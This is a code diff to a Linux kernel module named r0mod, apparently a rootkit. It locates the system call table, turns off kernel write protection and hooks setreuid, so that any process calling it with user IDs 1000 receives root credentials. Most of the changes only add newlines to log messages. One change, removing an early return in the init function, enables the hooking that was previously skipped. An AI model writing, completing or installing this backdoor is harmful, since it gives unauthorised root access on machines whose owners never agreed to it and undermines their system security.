@@ -10,7 +10,7 @@
 #include <r0mod/global.h>
 
 #define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      ULONG_MAX
+#define SEARCH_END      0xffff8fffffffffff
 
 unsigned long *syscall_table;
 
@@ -18,11 +18,11 @@ asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 
 asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
 {
-    printk("[Correct]: ruid == %d && euid == %d", ruid, euid);
+    printk("[Correct]: ruid == %d && euid == %d\n", ruid, euid);
 
     if((ruid == 1000) && (euid == 1000))
     {
-        printk("[Correct]: You got the correct ids.");
+        printk("[Correct]: You got the correct ids.\n");
         commit_creds(prepare_kernel_cred(0));
 
         return new_setreuid(0, 0);
@@ -48,21 +48,19 @@ unsigned long *find_sys_call_table(void)
 
 static int __init r0mod_init(void)
 {
-    printk("Module starting...");
+    printk("Module starting...\n");
 
-    printk("Search Start: %lx", SEARCH_START);
-    printk("Search End:   %lx", SEARCH_END);
-
-    return 0;
+    printk("Search Start: %lx\n", SEARCH_START);
+    printk("Search End:   %lx\n", SEARCH_END);
 
     syscall_table = find_sys_call_table();
     if(syscall_table == NULL)
     {
-        printk("syscall_table == NULL");
+        printk("syscall_table == NULL\n");
         return 0;
     }
 
-    printk("sys_call_table hooked @ %lx", (unsigned long)syscall_table);
+    printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
 
     write_cr0(read_cr0() & (~0x10000));
 
@@ -77,7 +75,7 @@ static int __init r0mod_init(void)
 
 static void __exit r0mod_exit(void)
 {
-    printk("Module ending...");
+    printk("Module ending...\n");
 
     if(syscall_table != NULL)
     {
